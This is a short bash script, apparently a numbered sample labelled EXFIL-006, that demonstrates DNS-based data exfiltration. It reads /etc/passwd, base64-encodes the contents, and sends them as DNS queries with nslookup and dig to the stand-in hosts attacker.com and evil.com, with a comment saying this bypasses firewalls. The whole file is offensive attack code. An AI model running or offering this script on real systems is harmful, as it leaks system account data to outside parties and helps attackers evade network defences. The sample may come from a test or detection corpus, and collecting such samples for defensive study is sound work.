#!/bin/bash
# EXFIL-006: DNS-based data exfiltration
# Encodes stolen data in DNS queries to bypass firewalls

SECRET=$(cat /etc/passwd | base64)
nslookup ${SECRET}.attacker.com
dig +short ${SECRET}.evil.com
